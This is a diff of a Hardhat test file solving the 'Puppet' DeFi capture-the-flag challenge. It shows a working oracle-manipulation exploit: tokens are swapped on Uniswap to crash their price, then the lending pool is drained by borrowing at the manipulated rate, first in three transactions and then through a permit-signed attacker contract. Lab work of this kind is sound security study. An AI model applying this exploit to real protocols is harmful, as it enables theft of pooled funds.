@@ -95,27 +95,51 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        // We first reduce the token price by swapping on Uniswap
-        console.log('Initial ETH: ', await player.getBalance(), ' - Initial Token: ', await token.balanceOf(player.address));
-        await token.connect(player).approve(uniswapExchange.address, await token.balanceOf(player.address));
-        await uniswapExchange.connect(player).tokenToEthSwapInput(
-            await token.balanceOf(player.address),
-            1,
-            (await ethers.provider.getBlock('latest')).timestamp * 2
-        );
-        console.log('After swap ETH: ', await player.getBalance(), ' - After swap Token: ', await token.balanceOf(player.address));
+        /*
+         * The exploit can be conducted in 3 transactions without the need of a contract in this test environment.
+         * To force us in using a more realistic method, we need to only make 1 transaction as player.
+         * This forces us to use a contract.
+         * If we did not use a contract in a real network, conditions could change between transactions.
+         * For instance, arbitrageurs could rebalance the pool, making our attack impossible.
+         * The commented lines below are from the solution without a contract.
+         */
+        // // We first reduce the token price by swapping on Uniswap
+        // await token.connect(player).approve(uniswapExchange.address, await token.balanceOf(player.address));
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(
+        //     await token.balanceOf(player.address),
+        //     1,
+        //     (await ethers.provider.getBlock('latest')).timestamp * 2
+        // );
+        // // We then borrow as much tokens as possible
+        // const depositForOneToken = BigInt(await lendingPool.calculateDepositRequired(10n ** 18n));
+        // let tokensToBorrow = BigInt(await player.getBalance()) / depositForOneToken * 10n ** 18n;
+        // const maxTokensToBorrow = await token.balanceOf(lendingPool.address);
+        // if (tokensToBorrow > maxTokensToBorrow) {
+        //     tokensToBorrow = maxTokensToBorrow;
+        // }
+        // const sendEth = await lendingPool.calculateDepositRequired(tokensToBorrow)
+        // await lendingPool.connect(player).borrow(tokensToBorrow, player.address, {value: sendEth});
 
-        // We then borrow as much tokens as possible
-        const depositForOneToken = BigInt(await lendingPool.calculateDepositRequired(10n ** 18n));
-        let tokensToBorrow = BigInt(await player.getBalance()) / depositForOneToken * 10n ** 18n;
-        const maxTokensToBorrow = await token.balanceOf(lendingPool.address);
-        console.log('Max Tokens: ', maxTokensToBorrow, ' - Tokens to borrow: ', tokensToBorrow);
-        if (tokensToBorrow > maxTokensToBorrow) {
-            tokensToBorrow = maxTokensToBorrow;
-        }
-        const sendEth = await lendingPool.calculateDepositRequired(tokensToBorrow)
-        await lendingPool.connect(player).borrow(tokensToBorrow, player.address, {value: sendEth});
-        console.log('After borrow ETH: ', await player.getBalance(), ' - After borrow Token: ', await token.balanceOf(player.address));
+        // We use permit to be able to access the tokens in the constructor
+        const { signERC2612Permit } = require('eth-permit');
+
+        // We need the future contract address for the permit
+        const attackContractAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: 0
+        });
+        
+        const { r, s, v } = await signERC2612Permit(
+            player,
+            token.address,
+            player.address,
+            attackContractAddress,
+            ethers.constants.MaxUint256
+        );
+
+        // We deploy the attacker contract
+        const attackContract = await ethers.getContractFactory('PuppetAttacker', player);
+        await attackContract.deploy(uniswapExchange.address, lendingPool.address, token.address, v, r, s, {value: ethers.utils.parseEther('24')});
     });
 
     after(async function () {
